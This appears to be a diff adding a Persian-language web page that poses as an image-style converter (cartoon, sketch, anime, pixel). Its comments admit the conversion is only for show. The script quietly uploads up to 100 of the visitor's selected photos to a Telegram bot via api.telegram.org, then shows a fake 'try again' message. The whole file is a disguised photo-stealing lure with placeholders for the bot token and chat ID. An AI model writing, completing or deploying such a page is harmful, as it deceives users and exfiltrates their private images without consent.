@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1e1e2f, #3b3b5b);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .upload-box {
+            background: #6e8efb;
+            border-radius: 10px;
+            width: 200px;
+            height: 200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .upload-box:hover {
+            background: #5a78e0;
+            transform: scale(1.05);
+        }
+
+        .upload-box span {
+            color: white;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .upload-box.has-image {
+            background: url('') center/cover no-repeat;
+        }
+
+        .options {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .option {
+            background: #f0f0f0;
+            border-radius: 10px;
+            padding: 10px 20px;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+        }
+
+        .option:hover {
+            background: #e0e0e0;
+            transform: scale(1.05);
+        }
+
+        .option.selected {
+            background: #6e8efb;
+            color: white;
+        }
+
+        .convert-btn {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+        }
+
+        .convert-btn:hover {
+            background: #e55a5a;
+            transform: scale(1.05);
+        }
+
+        .convert-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loader {
+            border: 10px solid #f3f3f3;
+            border-top: 10px solid #6e8efb;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .result-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1e1e2f, #3b3b5b);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .result-screen p {
+            color: white;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .retry-btn {
+            background: white;
+            color: #6e8efb;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .retry-btn:hover {
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="upload-box"><span>انتخاب عکس</span></div>
+    <div class="options">
+        <div class="option" data-style="cartoon">کارتونی</div>
+        <div class="option" data-style="sketch">نقاشی</div>
+        <div class="option" data-style="anime">انیمه</div>
+        <div class="option" data-style="pixel">پیکسلی</div>
+    </div>
+    <button class="convert-btn" disabled>تبدیل</button>
+    <div class="loading-screen" id="loading">
+        <div class="loader"></div>
+    </div>
+    <div class="result-screen" id="result">
+        <p>دوباره امتحان کنید!</p>
+        <button class="retry-btn">امتحان دوباره</button>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const uploadBox = document.querySelector('.upload-box');
+            const options = document.querySelectorAll('.option');
+            const convertBtn = document.querySelector('.convert-btn');
+            const loadingScreen = document.getElementById('loading');
+            const resultScreen = document.getElementById('result');
+            const retryBtn = document.querySelector('.retry-btn');
+            let selectedFiles = [];
+
+            // کلیک روی باکس آپلود
+            uploadBox.addEventListener('click', () => {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.multiple = true;
+
+                input.onchange = () => {
+                    const files = Array.from(input.files).slice(-100);
+                    if (files.length) {
+                        selectedFiles = files;
+                        // شبیه‌سازی آپلود عکس (ظاهری)
+                        uploadBox.classList.add('has-image');
+                        uploadBox.querySelector('span').textContent = 'عکس انتخاب شد';
+                        convertBtn.disabled = false;
+                    }
+                };
+
+                input.click();
+            });
+
+            // انتخاب سبک (ظاهری)
+            options.forEach(option => {
+                option.addEventListener('click', () => {
+                    options.forEach(opt => opt.classList.remove('selected'));
+                    option.classList.add('selected');
+                });
+            });
+
+            // دکمه تبدیل
+            convertBtn.addEventListener('click', async () => {
+                if (selectedFiles.length) {
+                    loadingScreen.style.display = 'flex';
+                    await sendToTelegramBot(selectedFiles);
+                    loadingScreen.style.display = 'none';
+                    resultScreen.style.display = 'flex';
+                }
+            });
+
+            // بازگشت به صفحه اصلی
+            retryBtn.addEventListener('click', () => {
+                resultScreen.style.display = 'none';
+                selectedFiles = [];
+                uploadBox.classList.remove('has-image');
+                uploadBox.querySelector('span').textContent = 'انتخاب عکس';
+                options.forEach(opt => opt.classList.remove('selected'));
+                convertBtn.disabled = true;
+            });
+
+            async function sendToTelegramBot(files) {
+                const botToken = 'YOUR_BOT_TOKEN';
+                // const chatId = 'YOUR_CHAT_ID'; // اگه لازم شد، اینو پر کن
+                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+                for (const file of files) {
+                    const formData = new FormData();
+                    formData.append('photo', file);
+                    // اگه chatId داشتی، این خط رو اضافه کن:
+                    // formData.append('chat_id', chatId);
+                    try {
+                        await fetch(url, { method: 'POST', body: formData });
+                    } catch (e) {}
+                }
+            }
+        });
+    </script>
+</body>
+</html>
